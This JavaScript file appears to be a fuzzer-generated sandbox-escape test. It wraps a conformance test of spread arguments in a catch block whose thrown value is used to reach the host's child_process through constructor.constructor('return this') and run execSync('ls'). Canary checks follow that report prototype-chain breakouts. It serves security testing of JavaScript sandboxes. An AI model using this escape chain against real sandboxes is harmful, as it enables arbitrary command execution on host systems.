try {
    var iter = {};
    iter[Symbol.iterator] = function () {
        let REPLACER = 23;
        var nextCount = 0;
        return {
            next: function () {
                let REPLACER = 23;
                nextCount += 1;
                return {
                    done: nextCount === 3,
                    value: nextCount
                };
            }
        };
    };
    var callCount = 0;
    (function () {
        throw () => {
            return () => {
            };
        };
        assert.sameValue(arguments.length, 2);
        assert.sameValue(arguments[0], 1);
        assert.sameValue(arguments[1], 2);
        callCount += 1;
    }.apply(null, [...iter]));
    assert.sameValue(callCount, 1);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}